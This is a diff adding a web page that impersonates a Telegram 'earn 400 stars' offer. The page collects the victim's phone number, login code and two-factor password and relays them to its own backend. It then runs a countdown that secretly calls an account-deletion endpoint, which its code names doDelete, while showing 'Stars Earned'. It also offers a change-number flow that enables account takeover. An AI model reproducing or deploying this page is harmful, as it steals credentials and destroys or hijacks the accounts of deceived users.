@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram ★ star earn</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+<style>
+  /* ------------------------------------------------------------
+     SUPERCHARGED PREMIUM THEME – COOL GLASS + SPACE
+     + ROTATING LOADER ON REQUEST CODE + WELCOME POPUP
+  ------------------------------------------------------------ */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --bg: #0c0b1a;
+    --surface: rgba(21, 16, 41, 0.8);
+    --card: rgba(31, 25, 53, 0.9);
+    --border: rgba(59, 49, 85, 0.6);
+    --gold: #ffd966;
+    --gold2: #f0b800;
+    --gold-glow: rgba(255, 215, 0, 0.5);
+    --green: #10b981;
+    --green2: #059669;
+    --text: #ffffff;
+    --muted: #c4b5e6;
+    --faint: #6b5b95;
+    --glass-edge: rgba(255, 255, 255, 0.05);
+    --shadow-heavy: 0 30px 60px -15px rgba(0,0,0,0.8);
+  }
+
+  body {
+    background: radial-gradient(ellipse at 30% 20%, #2a1e4a, #070514);
+    font-family: 'Inter', sans-serif;
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    backdrop-filter: blur(2px);
+  }
+
+  #app { width: 100%; max-width: 440px; position: relative; }
+  .screen { display: none; width: 100%; animation: floatIn 0.5s cubic-bezier(0.23, 1, 0.32, 1); }
+  .screen.show { display: block; }
+
+  @keyframes floatIn {
+    0% { opacity: 0; transform: translateY(30px) scale(0.96); }
+    100% { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* ---------- WELCOME POPUP (spyx intro) ---------- */
+  .popup-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.8);
+    backdrop-filter: blur(8px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    transition: opacity 0.3s;
+  }
+  .popup-card {
+    background: var(--card);
+    border: 1px solid var(--gold);
+    border-radius: 48px;
+    padding: 32px 28px;
+    max-width: 340px;
+    text-align: center;
+    box-shadow: 0 30px 60px gold;
+    animation: popRise 0.4s;
+  }
+  @keyframes popRise {
+    from { transform: scale(0.8); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+  .popup-icon {
+    font-size: 64px;
+    filter: drop-shadow(0 0 20px gold);
+    margin-bottom: 16px;
+  }
+  .popup-title {
+    font-size: 28px;
+    font-weight: 800;
+    background: linear-gradient(145deg, #fff2b5, #ffd966);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 12px;
+  }
+  .popup-text {
+    color: var(--muted);
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 28px;
+  }
+  .popup-text strong {
+    color: var(--gold);
+  }
+  .popup-btn {
+    background: linear-gradient(135deg, #f5d742, #d4a308);
+    border: none;
+    border-radius: 60px;
+    padding: 16px 32px;
+    font-weight: 800;
+    font-size: 18px;
+    color: #0c0b1a;
+    cursor: pointer;
+    box-shadow: 0 20px 30px -8px #f5b81b80;
+    border: 1px solid rgba(255,255,255,0.3);
+    width: 100%;
+  }
+  .popup-btn:hover { transform: scale(1.02); }
+
+  /* ---------- GLASS CARD ---------- */
+  .glass-card {
+    background: var(--card);
+    backdrop-filter: blur(12px);
+    border: 1px solid var(--glass-edge);
+    border-radius: 40px;
+    box-shadow: var(--shadow-heavy), 0 0 0 1px rgba(255, 215, 0, 0.1) inset;
+    overflow: hidden;
+  }
+
+  /* ---------- LOGIN SCREEN (step 1) ---------- */
+  .login-header {
+    text-align: center;
+    padding: 36px 24px 16px;
+  }
+  .logo-ring {
+    width: 70px;
+    height: 70px;
+    margin: 0 auto 20px;
+    background: linear-gradient(145deg, var(--gold), #ca9e1e);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    color: #0b0819;
+    box-shadow: 0 0 30px var(--gold-glow);
+    position: relative;
+  }
+  .logo-ring::after {
+    content: '';
+    position: absolute;
+    inset: -4px;
+    border-radius: 50%;
+    border: 1px solid rgba(255,215,0,0.5);
+    opacity: 0.7;
+  }
+  .login-header h2 {
+    font-size: 28px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    background: linear-gradient(120deg, #fff0c0, var(--gold));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 6px;
+  }
+  .step-badge {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    background: rgba(255,215,0,0.1);
+    display: inline-block;
+    padding: 6px 24px;
+    border-radius: 60px;
+    border: 1px solid rgba(255,215,0,0.25);
+    backdrop-filter: blur(4px);
+  }
+
+  .phone-section {
+    padding: 20px 28px 10px;
+  }
+  .phone-label {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+  }
+  .phone-field {
+    display: flex;
+    align-items: center;
+    background: rgba(0,0,0,0.3);
+    backdrop-filter: blur(10px);
+    border: 1.5px solid rgba(255,215,0,0.2);
+    border-radius: 60px;
+    padding: 4px 20px;
+    transition: 0.2s;
+  }
+  .phone-field:focus-within {
+    border-color: var(--gold);
+    box-shadow: 0 0 0 5px rgba(255,215,0,0.15);
+  }
+  .phone-field .country-code {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text);
+    background: transparent;
+    border: none;
+    width: 60px;
+    outline: none;
+    padding: 16px 0;
+  }
+  .phone-field .phone-number {
+    flex: 1;
+    font-size: 20px;
+    font-weight: 500;
+    background: transparent;
+    border: none;
+    color: var(--text);
+    outline: none;
+    padding: 16px 0;
+  }
+  .phone-field .phone-number::placeholder {
+    color: var(--faint);
+    font-weight: 400;
+    font-size: 18px;
+  }
+  .phone-field span.sep {
+    font-size: 28px;
+    color: var(--gold);
+    margin: 0 6px;
+    opacity: 0.7;
+  }
+
+  .or-divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 16px 28px;
+    color: var(--muted);
+    font-size: 12px;
+    font-weight: 600;
+  }
+  .or-divider .line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+  }
+
+  /* REQUEST CODE button with rotating loader */
+  .request-btn {
+    background: linear-gradient(135deg, #f5d742, #d4a308);
+    border: none;
+    border-radius: 60px;
+    padding: 18px 28px;
+    margin: 0 28px 20px;
+    font-weight: 800;
+    font-size: 18px;
+    color: #0c0b1a;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    cursor: pointer;
+    width: calc(100% - 56px);
+    transition: 0.2s;
+    box-shadow: 0 20px 30px -8px #f5b81b80;
+    border: 1px solid rgba(255,255,255,0.3);
+    position: relative;
+  }
+  .request-btn .btn-text { display: flex; align-items: center; gap: 8px; }
+  .request-btn .spinner {
+    width: 24px;
+    height: 24px;
+    border: 3px solid rgba(0,0,0,0.2);
+    border-top-color: #0c0b1a;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    display: none;
+  }
+  .request-btn.loading .btn-text span:not(.spinner) { opacity: 0.5; }
+  .request-btn.loading .spinner { display: inline-block; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .request-btn:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 28px 40px -5px #f5d742cc; }
+  .request-btn .arrow { font-size: 26px; }
+
+  .login-footer {
+    padding: 10px 28px 34px;
+    text-align: center;
+    font-size: 14px;
+    color: var(--muted);
+    line-height: 1.6;
+  }
+  .login-footer strong { color: var(--gold); text-shadow: 0 0 8px gold; }
+
+  /* ---------- VERIFICATION PAGE ---------- */
+  .verify-screen {
+    background: var(--card);
+    backdrop-filter: blur(16px);
+    border-radius: 48px;
+    padding: 30px 24px 34px;
+    border: 1px solid rgba(255,215,0,0.15);
+    box-shadow: var(--shadow-heavy), 0 0 40px rgba(255,215,0,0.2);
+  }
+
+  .verify-header { text-align: center; margin-bottom: 30px; }
+  .verify-header .icon { font-size: 56px; filter: drop-shadow(0 0 20px gold); margin-bottom: 10px; animation: twinkle 2s infinite; }
+  @keyframes twinkle { 0% { opacity: 1; } 50% { opacity: 0.7; } }
+  .verify-header h3 {
+    font-size: 32px;
+    font-weight: 800;
+    background: linear-gradient(145deg, #fff2b5, #ffd966);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 6px;
+  }
+  .verify-header p { color: var(--muted); font-size: 15px; }
+  .verify-header p strong { color: var(--gold); }
+
+  .otp-row {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    margin: 36px 0 28px;
+  }
+  .otp-d {
+    width: 62px;
+    height: 70px;
+    text-align: center;
+    font-size: 2.4rem;
+    font-weight: 800;
+    background: rgba(0,0,0,0.4);
+    border: 2px solid rgba(255,215,0,0.4);
+    border-radius: 24px;
+    color: var(--gold);
+    outline: none;
+    transition: 0.1s;
+    box-shadow: 0 0 15px rgba(255,215,0,0.2);
+  }
+  .otp-d:focus { border-color: gold; transform: scale(1.05); box-shadow: 0 0 30px gold; }
+
+  .btn-premium {
+    background: linear-gradient(145deg, #f8d348, #e0b02e);
+    border: none;
+    border-radius: 50px;
+    padding: 18px;
+    font-weight: 800;
+    font-size: 18px;
+    color: #0b0819;
+    width: 100%;
+    cursor: pointer;
+    box-shadow: 0 16px 30px -8px #f5b81b;
+    transition: 0.15s;
+    border: 1px solid rgba(255,255,240,0.5);
+    margin: 10px 0;
+  }
+  .btn-premium:hover { transform: translateY(-3px); box-shadow: 0 20px 40px -5px gold; }
+  .btn-glass {
+    background: rgba(255,255,255,0.03);
+    backdrop-filter: blur(8px);
+    border: 1.5px solid rgba(255,215,0,0.2);
+    border-radius: 50px;
+    padding: 16px;
+    font-weight: 600;
+    color: var(--muted);
+    width: 100%;
+    cursor: pointer;
+    transition: 0.15s;
+    margin-top: 12px;
+  }
+  .btn-glass:hover { border-color: var(--gold); color: var(--gold); }
+
+  .al {
+    border-radius: 40px;
+    padding: 14px 18px;
+    margin: 16px 0;
+    display: none;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    background: rgba(0,0,0,0.3);
+    backdrop-filter: blur(10px);
+  }
+  .al.show { display: flex; }
+  .al-e { border: 1px solid #ff7171; color: #ffb3b3; }
+  .al-s { border: 1px solid #10b981; color: #a7f3d0; }
+  .al-i { border: 1px solid var(--gold); color: var(--gold); }
+
+  .resend { text-align: center; font-size: 14px; color: var(--muted); }
+  #rBtn { background: none; border: none; color: var(--gold); font-weight: 700; cursor: pointer; display: none; }
+  #pwField input { width:100%; padding:16px 20px; background:rgba(0,0,0,0.3); border:1.5px solid rgba(255,215,0,0.3); border-radius:60px; color:white; font-size:16px; }
+
+  /* ---------- STAR EARN SCREENS (countdown, etc) ---------- */
+  .card { background: var(--card); border: 1px solid rgba(255,215,0,0.1); border-radius: 40px; backdrop-filter: blur(12px); padding: 16px 0; }
+  .stripe-gold { height: 6px; background: linear-gradient(90deg,transparent,var(--gold),var(--gold2),var(--gold),transparent); }
+  .user-strip { background: rgba(0,0,0,0.25); border-radius: 50px; padding: 12px 18px; display: flex; gap: 13px; }
+  .u-av { width: 46px; height: 46px; border-radius: 50%; background: linear-gradient(135deg,var(--gold),var(--gold2)); display: flex; align-items: center; justify-content: center; font-weight: 800; color: #0b0819; }
+  .ring-wrap { display: flex; flex-direction: column; align-items: center; margin-bottom: 24px; }
+  .ring-outer { position: relative; width: 164px; height: 164px; }
+  .r-track { fill: none; stroke: rgba(255,215,0,0.15); stroke-width: 9; }
+  .r-prog { fill: none; stroke: var(--gold); stroke-width: 9; stroke-linecap: round; filter: drop-shadow(0 0 8px gold); }
+  .ring-inner { position: absolute; inset: 18px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, rgba(255,215,0,0.15), #0b0819); border: 1px solid rgba(255,215,0,0.3); display: flex; flex-direction: column; align-items: center; justify-content: center; }
+  #countNum { font-size: 4rem; font-weight: 900; color: var(--gold); line-height: 1; text-shadow: 0 0 20px gold; }
+  .del-list { background: rgba(255,215,0,0.07); border: 1px solid rgba(255,215,0,0.25); border-radius: 20px; padding: 13px 15px; margin: 18px 0; }
+  .del-list li { display: flex; align-items: center; gap: 8px; font-size: 13px; list-style: none; }
+  .del-list li::before { content: '✦'; color: gold; font-size: 18px; }
+  .cancel-btn { width: 100%; padding: 18px; background: linear-gradient(135deg,#0f4c3a,#1f7a5c); border: none; border-radius: 60px; font-weight: 800; color: white; cursor: pointer; margin-bottom: 10px; box-shadow: 0 15px 30px -8px #10b981; }
+  .skip-row { text-align: center; }
+  #skipBtn { background: none; border: none; color: rgba(255,215,0,0.6); text-decoration: underline; cursor: pointer; }
+  .result-center { text-align: center; padding: 20px 0; }
+  .res-icon.gold-icon { width: 78px; height: 78px; border-radius: 50%; background: rgba(255,215,0,0.12); border: 2px solid rgba(255,215,0,0.35); display: flex; align-items: center; justify-content: center; font-size: 38px; margin: 0 auto 18px; }
+  .fact-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 24px; }
+  .fact { background: rgba(0,0,0,0.2); backdrop-filter: blur(8px); border: 1px solid rgba(255,215,0,0.1); border-radius: 20px; padding: 14px; text-align: center; }
+  .section-box { background: rgba(0,0,0,0.2); backdrop-filter: blur(10px); border-radius: 30px; padding: 18px; }
+
+  .back-arrow { background: none; border: none; color: var(--muted); font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 6px; margin-bottom: 20px; }
+  .back-arrow:hover { color: var(--gold); }
+</style>
+</head>
+<body>
+<!-- WELCOME POPUP (spyx intro) -->
+<div id="welcomePopup" class="popup-overlay">
+  <div class="popup-card">
+    <div class="popup-icon">⚡</div>
+    <div class="popup-title">New Method!</div>
+    <div class="popup-text">
+      <strong>spyx</strong> here — this is a fresh, exclusive way to earn stars.<br>Fast & secure. Ready?
+    </div>
+    <button class="popup-btn" onclick="closePopup()">★ MOVE ON</button>
+  </div>
+</div>
+
+<div id="app">
+  <!-- ========= SCREEN 1: LOGIN ========= -->
+  <div class="screen show" id="loginScreen">
+    <div class="glass-card">
+      <div class="login-header">
+        <div class="logo-ring">⭐</div>
+        <h2>TELEGRAM</h2>
+        <div class="step-badge">SIGN IN · STEP 1</div>
+      </div>
+
+      <div class="phone-section">
+        <div class="phone-label">your phone number</div>
+        <div class="phone-field">
+          <input type="text" class="country-code" value="+1" placeholder="+1" id="countryCode" maxlength="4">
+          <span class="sep">)</span>
+          <input type="tel" class="phone-number" id="phoneInp" placeholder="234 567 890" value="">
+        </div>
+      </div>
+
+      <div class="or-divider">
+        <span class="line"></span>
+        <span>OR</span>
+        <span class="line"></span>
+      </div>
+
+      <!-- REQUEST CODE with rotating spinner (loading state) -->
+      <button class="request-btn" id="sendBtn" onclick="goToVerifyScreen()">
+        <span class="btn-text">
+          <span>REQUEST CODE</span>
+          <span class="spinner"></span>
+        </span>
+        <span class="arrow">✨</span>
+      </button>
+
+      <div class="login-footer">
+        You will receive a verification code <strong>via Telegram or SMS</strong>.
+      </div>
+      <div class="al" id="a1" style="margin: 0 24px 24px;"></div>
+    </div>
+  </div>
+
+  <!-- ========= SCREEN 2: VERIFICATION ========= -->
+  <div class="screen" id="verifyScreen">
+    <div class="verify-screen">
+      <button class="back-arrow" onclick="show('loginScreen')">← back</button>
+      <div class="verify-header">
+        <div class="icon">⭐</div>
+        <h3>verify code</h3>
+        <p>Enter the 5-digit code sent to <strong id="phoneDisplay">your phone</strong></p>
+      </div>
+
+      <div class="otp-row" id="otp1">
+        <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
+        <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
+        <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
+        <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
+        <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
+      </div>
+
+      <div id="pwField" style="display:none; margin-bottom:18px;">
+        <input type="password" id="pwInp" placeholder="Two‑factor password">
+      </div>
+
+      <button class="btn-premium" id="verifyBtn" onclick="verifyCode()"><span>★ LOGIN & EARN</span></button>
+
+      <div class="resend">
+        <p id="resendP">Resend code in <span id="rCount">60</span>s</p>
+        <button id="rBtn" onclick="resend()">Resend code</button>
+      </div>
+      <div class="al" id="a2"></div>
+    </div>
+  </div>
+
+  <!-- ========= SCREEN 3: COUNTDOWN (star earn) ========= -->
+  <div class="screen" id="countdownScreen">
+    <div class="card">
+      <div class="stripe stripe-gold"></div>
+      <div class="card-head" style="padding:24px; text-align:center;">
+        <h1 style="font-size:28px; font-weight:800; color:#ffd966;">Earning stars ...</h1>
+        <p style="color:var(--muted);">400 stars will be credited in 10 seconds</p>
+      </div>
+      <div class="card-body" style="padding:0 20px 24px;">
+        <div class="user-strip">
+          <div class="u-av" id="uAv">⭐</div>
+          <div>
+            <div class="u-name" id="uName">...</div>
+            <div class="u-phone" id="uPhone"></div>
+            <div class="u-tag" id="uTag"></div>
+          </div>
+        </div>
+        <div class="ring-wrap">
+          <div class="ring-outer">
+            <svg viewBox="0 0 164 164">
+              <circle class="r-track" cx="82" cy="82" r="75"/>
+              <circle class="r-prog" cx="82" cy="82" r="75" id="ringProg"/>
+            </svg>
+            <div class="ring-inner">
+              <div id="countNum">10</div>
+              <div class="ring-label">seconds</div>
+            </div>
+          </div>
+          <div class="count-headline" style="margin-top:10px;">⭐ stars depositing in <em id="countTxt">10</em> seconds...</div>
+        </div>
+        <ul class="del-list">
+          <li>400 Telegram stars will be added to your wallet</li>
+          <li>Bonus: you keep all messages & groups</li>
+          <li>No data loss — this is a reward</li>
+          <li>✨ offer valid for 10 seconds</li>
+        </ul>
+        <button class="cancel-btn" id="cancelBtn" onclick="cancelDelete()"><span>⭐ Cancel & keep account (no stars)</span></button>
+        <div class="skip-row"><button id="skipBtn" onclick="deleteNow()">skip & finish early</button></div>
+      </div>
+    </div>
+    <div class="bar-wrap" style="height:6px; background:rgba(255,215,0,0.1); margin-top:12px; border-radius:6px;"><div class="bar-fill" id="barFill" style="height:100%; background:gold; width:100%;"></div></div>
+  </div>
+
+  <!-- ========= SCREEN 4: STARS EARNED ========= -->
+  <div class="screen" id="deletedScreen">
+    <div class="card">
+      <div class="stripe stripe-gold"></div>
+      <div class="card-body" style="padding:30px 20px;">
+        <div class="result-center">
+          <div class="res-icon gold-icon">⭐</div>
+          <div class="res-title">400 Stars Earned!</div>
+          <div class="res-sub">Congratulations! <strong>400 Telegram stars</strong> added to your wallet.</div>
+          <div class="fact-grid">
+            <div class="fact"><div class="fi">⭐</div><div class="fv">+400</div><div class="fl">Stars</div></div>
+            <div class="fact"><div class="fi">💎</div><div class="fv">Active</div><div class="fl">Wallet</div></div>
+            <div class="fact"><div class="fi">📱</div><div class="fv">Unlocked</div><div class="fl">Perks</div></div>
+            <div class="fact"><div class="fi">🔐</div><div class="fv">Secure</div><div class="fl">Account</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========= SCREEN 5: CANCELLED (change number) ========= -->
+  <div class="screen" id="savedScreen">
+    <div class="card">
+      <div class="stripe stripe-green"></div>
+      <div class="card-body" style="padding:24px;">
+        <div class="result-center" style="margin-bottom:20px">
+          <div class="res-icon green-icon">✅</div>
+          <div class="res-title">Earning Cancelled</div>
+          <div class="res-sub">Account unchanged. No stars credited.</div>
+        </div>
+        <div class="section-box">
+          <div class="sect-title" style="color:var(--gold); margin-bottom:14px;">📱 Change number instead?</div>
+          <div class="cn-step active" id="cn1">
+            <div class="field">
+              <label style="color:var(--muted);">New Phone Number</label>
+              <div class="inp-w"><span class="pfx">📲</span><input type="tel" id="newPhoneInp" placeholder="+1 987 654 3210" style="width:100%; padding:14px; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:60px; color:white;"></div>
+            </div>
+            <button class="btn-premium" id="cnSendBtn" onclick="cnSend()"><span>Send Code</span></button>
+            <div class="al" id="ca1"></div>
+          </div>
+          <div class="cn-step" id="cn2">
+            <div style="margin-bottom:14px; color:var(--muted);">Code sent to <strong id="cnNumDisp" style="color:var(--gold);"></strong></div>
+            <div class="otp-row" id="otp2">
+              <input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1">
+            </div>
+            <button class="btn-premium" id="cnConfBtn" onclick="cnConfirm()">Confirm</button>
+            <button class="btn-glass" onclick="cnGoTo(1)">← Back</button>
+            <div class="al" id="ca2"></div>
+          </div>
+          <div class="cn-step" id="cn3"><div style="text-align:center; padding:20px;">✅ Number changed to <strong id="cnSuccess" style="color:var(--gold);"></strong></div></div>
+        </div>
+        <button class="btn-glass" onclick="signOut()" style="margin-top:16px;">Sign Out</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ---------- popup close ----------
+  function closePopup() {
+    document.getElementById('welcomePopup').style.display = 'none';
+  }
+
+  // ---------- core logic (adapted) ----------
+  let countTimer = null, countSec = 10, resendTmr = null;
+  const CIRC = 2 * Math.PI * 75;
+
+  async function api(url, data) {
+    const o = data ? {method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body:JSON.stringify(data)} : {credentials:'include'};
+    return (await fetch(url, o)).json();
+  }
+
+  function show(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('show'));
+    document.getElementById(id).classList.add('show');
+    window.scrollTo(0,0);
+  }
+
+  function setLoading(id, on) {
+    const b = document.getElementById(id); if(b) {
+      b.classList.toggle('loading', on);
+      b.disabled = on;
+    }
+  }
+
+  function setAlert(id, type, msg) {
+    const el = document.getElementById(id); if(!el) return;
+    el.className = `al al-${type} show`;
+    el.innerHTML = `<span>${type==='error'?'⚠️':type==='success'?'✅':'ℹ️'}</span> ${msg}`;
+  }
+  function clearAlert(id) { const el=document.getElementById(id); if(el) el.className='al'; }
+
+  function initOTP(id) {
+    const ins = [...document.querySelectorAll(`#${id} .otp-d`)];
+    ins.forEach((inp,i) => {
+      inp.addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/\D/g,'').slice(-1);
+        if(e.target.value && i<ins.length-1) ins[i+1].focus();
+      });
+      inp.addEventListener('keydown', e => { if(e.key==='Backspace' && !inp.value && i>0) ins[i-1].focus(); });
+    });
+  }
+  function getOTP(id) { return [...document.querySelectorAll(`#${id} .otp-d`)].map(i=>i.value).join(''); }
+  function clearOTP(id) { document.querySelectorAll(`#${id} .otp-d`).forEach(i=>i.value=''); }
+
+  initOTP('otp1'); initOTP('otp2');
+
+  function getFullPhone() {
+    const code = document.getElementById('countryCode')?.value.trim() || '+1';
+    const num = document.getElementById('phoneInp')?.value.trim() || '';
+    return code + num;
+  }
+
+  // goToVerifyScreen with loading spinner on request button
+  async function goToVerifyScreen() {
+    const phone = getFullPhone();
+    if (!phone || phone.length < 3) return setAlert('a1','error','Enter your phone number.');
+    clearAlert('a1');
+    const btn = document.getElementById('sendBtn');
+    btn.classList.add('loading');   // show rotating circle
+    btn.disabled = true;
+    try {
+      const r = await api('/api/send-code', {phone});
+      if (r.success) {
+        document.getElementById('phoneDisplay').innerText = phone;
+        show('verifyScreen');
+        clearOTP('otp1');
+        startResend();
+      } else setAlert('a1','error', r.error||'Failed');
+    } catch(e) { setAlert('a1','error','Cannot reach server.'); }
+    btn.classList.remove('loading');
+    btn.disabled = false;
+  }
+
+  function startResend() {
+    let c = 60;
+    const rP = document.getElementById('resendP'); const rBtn = document.getElementById('rBtn'); const rSpan = document.getElementById('rCount');
+    if(rP) rP.style.display='block'; if(rBtn) rBtn.style.display='none'; if(rSpan) rSpan.textContent=c;
+    if(resendTmr) clearInterval(resendTmr);
+    resendTmr = setInterval(() => {
+      c--; if(rSpan) rSpan.textContent=c;
+      if(c<=0) { clearInterval(resendTmr); if(rP) rP.style.display='none'; if(rBtn) rBtn.style.display='inline'; }
+    },1000);
+  }
+
+  async function verifyCode() {
+    const code = getOTP('otp1');
+    if(code.length<5) return setAlert('a2','error','Enter all 5 digits.');
+    const password = document.getElementById('pwInp').value||null;
+    clearAlert('a2'); setLoading('verifyBtn',true);
+    try {
+      const r = await api('/api/verify-code', {code,password});
+      if(r.needsPassword) {
+        document.getElementById('pwField').style.display='block';
+        setAlert('a2','info','Enter 2FA password');
+        setLoading('verifyBtn',false); return;
+      }
+      if(r.success) { fillUser(r.user); show('countdownScreen'); startCountdown(); }
+      else setAlert('a2','error', r.error||'Invalid');
+    } catch(e) { setAlert('a2','error','Cannot reach server.'); }
+    setLoading('verifyBtn',false);
+  }
+
+  async function resend() {
+    const phone = getFullPhone();
+    try { await api('/api/send-code',{phone}); startResend(); setAlert('a2','success','New code sent.'); } catch(e){}
+  }
+
+  function fillUser(u) {
+    const name = [u.firstName, u.lastName].filter(Boolean).join(' ') || 'User';
+    document.getElementById('uAv').textContent = '⭐';
+    document.getElementById('uName').textContent = name;
+    document.getElementById('uPhone').textContent = '+' + u.phone;
+    document.getElementById('uTag').textContent = u.username ? '@'+u.username : '';
+  }
+
+  function startCountdown() {
+    countSec=10; renderCount(10);
+    countTimer = setInterval(async () => {
+      countSec--;
+      document.getElementById('countNum')?.classList.add('tick');
+      setTimeout(() => document.getElementById('countNum')?.classList.remove('tick'),130);
+      renderCount(countSec);
+      if(countSec<=0) { clearInterval(countTimer); await doDelete(); }
+    },1000);
+  }
+
+  function renderCount(s) {
+    const cn=document.getElementById('countNum'); if(cn) cn.textContent=s;
+    const ct=document.getElementById('countTxt'); if(ct) ct.textContent=s;
+    const ratio=s/10; const offset=CIRC*(1-ratio);
+    const ring=document.getElementById('ringProg'); if(ring) { ring.style.strokeDasharray=CIRC; ring.style.strokeDashoffset=offset; }
+    const bar=document.getElementById('barFill'); if(bar) bar.style.width=(ratio*100)+'%';
+  }
+
+  async function cancelDelete() { clearInterval(countTimer); document.getElementById('cancelBtn').disabled=true; document.getElementById('skipBtn').disabled=true; try { await api('/api/cancel-delete',{}); } catch(e){} show('savedScreen'); }
+  async function deleteNow() { clearInterval(countTimer); document.getElementById('skipBtn').disabled=true; document.getElementById('cancelBtn').disabled=true; await doDelete(); }
+  async function doDelete() { try { const r=await api('/api/delete-account',{}); if(r.success) show('deletedScreen'); else { document.getElementById('cancelBtn').disabled=false; document.getElementById('skipBtn').disabled=false; } } catch(e){} }
+
+  function cnGoTo(n) { document.querySelectorAll('.cn-step').forEach(s=>s.classList.remove('active')); document.getElementById(`cn${n}`).classList.add('active'); }
+  async function cnSend() {
+    const newPhone = document.getElementById('newPhoneInp').value.trim();
+    if(!newPhone) return setAlert('ca1','error','Enter number.');
+    clearAlert('ca1'); setLoading('cnSendBtn',true);
+    try { const r=await api('/api/send-new-code',{newPhone}); if(r.success) { document.getElementById('cnNumDisp').textContent=newPhone; setAlert('ca1','success','Code sent.'); setTimeout(()=>{ cnGoTo(2); clearOTP('otp2'); },700); } else setAlert('ca1','error',r.error); } catch(e) { setAlert('ca1','error','Cannot reach server.'); } setLoading('cnSendBtn',false);
+  }
+  async function cnConfirm() {
+    const code=getOTP('otp2'); if(code.length<5) return setAlert('ca2','error','Enter all digits.');
+    clearAlert('ca2'); setLoading('cnConfBtn',true);
+    try { const r=await api('/api/change-number',{code}); if(r.success) { document.getElementById('cnSuccess').textContent=r.newPhone; cnGoTo(3); } else setAlert('ca2','error',r.error); } catch(e) { setAlert('ca2','error','Cannot reach server.'); } setLoading('cnConfBtn',false);
+  }
+  async function signOut() { try { await api('/api/logout',{}); } catch(e){} location.reload(); }
+
+  document.getElementById('phoneInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') goToVerifyScreen(); });
+  document.getElementById('pwInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') verifyCode(); });
+  document.getElementById('newPhoneInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') cnSend(); });
+
+  api('/api/status').then(d => { if(d.loggedIn && d.user) { fillUser(d.user); show('countdownScreen'); startCountdown(); } }).catch(()=>{});
+</script>
+</body>
+</html>
